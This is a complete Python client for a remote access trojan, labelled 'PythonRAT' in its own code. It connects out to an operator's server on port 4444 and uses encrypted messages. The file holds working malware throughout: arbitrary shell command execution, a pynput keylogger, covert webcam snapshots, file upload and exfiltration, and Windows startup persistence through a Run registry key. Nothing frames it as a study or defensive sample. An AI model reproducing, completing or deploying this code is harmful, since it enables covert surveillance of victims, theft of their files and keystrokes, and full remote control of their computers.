import socket
import threading
import subprocess
import os
import base64
from cryptography.fernet import Fernet
import struct
import platform
import time
import sys
from io import BytesIO
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import pynput
except ImportError:
    pynput = None

# ==== Encryption Key Setup ====
KEY_FILE = "rat_key.key"
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
fernet = Fernet(key)

SERVER_IP = ""  # Change to your server IP
SERVER_PORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# ==== Helper functions for message framing ====
def send_msg(sock, message_bytes):
    msg_len = struct.pack('>I', len(message_bytes))
    sock.sendall(msg_len + message_bytes)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen)

# ==== Persistence (Windows example) ====
def add_persistence():
    try:
        import shutil
        appdata = os.getenv("APPDATA")
        destination = os.path.join(appdata, "client.exe")
        if not os.path.exists(destination):
            shutil.copyfile(sys.executable, destination)
            # Add registry key to run on startup
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "PythonRAT", 0, winreg.REG_SZ, destination)
            key.Close()
        return "[INFO] Persistence added"
    except Exception as e:
        return f"[ERROR] Persistence failed: {e}"

# ==== Keylogger setup ====
keylogs = []
def on_press(key):
    try:
        keylogs.append(str(key.char))
    except AttributeError:
        keylogs.append(f"[{key.name}]")

def start_keylogger():
    if pynput:
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
    else:
        pass  # pynput not installed, skip keylogger

def get_keylogs():
    global keylogs
    logs = "".join(keylogs)
    keylogs = []
    return logs

def take_snapshot():
    if cv2:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buf = cv2.imencode('.png', frame)
            img_b64 = base64.b64encode(buf).decode()
            return img_b64
    return None

def handle_command(cmd):
    if cmd.startswith("__upload__::"):
        # Upload file received from server
        try:
            parts = cmd.split("::", 2)
            filename = parts[1]
            b64data = parts[2]
            filedata = base64.b64decode(b64data)
            with open(filename, "wb") as f:
                f.write(filedata)
            return f"[INFO] File {filename} uploaded successfully"
        except Exception as e:
            return f"[ERROR] Upload failed: {e}"

    elif cmd.startswith("__download__::"):
        # Send file content to server
        filename = cmd.split("::")[1]
        if os.path.exists(filename):
            try:
                with open(filename, "rb") as f:
                    filedata = f.read()
                b64data = base64.b64encode(filedata).decode()
                return f"__download__::{filename}::{b64data}"
            except Exception as e:
                return f"[ERROR] Download failed: {e}"
        else:
            return f"[ERROR] File {filename} not found"

    elif cmd == "__snap__":
        img_b64 = take_snapshot()
        if img_b64:
            return f"__image__::{img_b64}"
        else:
            return "[ERROR] Could not take snapshot (OpenCV missing or no webcam)"

    elif cmd == "__keylog__":
        return get_keylogs()

    elif cmd == "__persist__":
        return add_persistence()

    else:
        # Execute shell command
        try:
            if platform.system().lower() == "windows":
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            else:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable='/bin/bash')
            return result.decode(errors='ignore')
        except Exception as e:
            return f"[ERROR] {e}"

def main():
    global sock
    while True:
        try:
            sock.connect((SERVER_IP, SERVER_PORT))
            break
        except:
            time.sleep(5)

    # Start keylogger thread
    threading.Thread(target=start_keylogger, daemon=True).start()

    while True:
        try:
            data = recv_msg(sock)
            if data is None:
                break

            decrypted_cmd = fernet.decrypt(data).decode()
            response = handle_command(decrypted_cmd)
            enc_response = fernet.encrypt(response.encode())
            send_msg(sock, enc_response)
        except Exception:
            break
    sock.close()

if __name__ == "__main__":
    main()
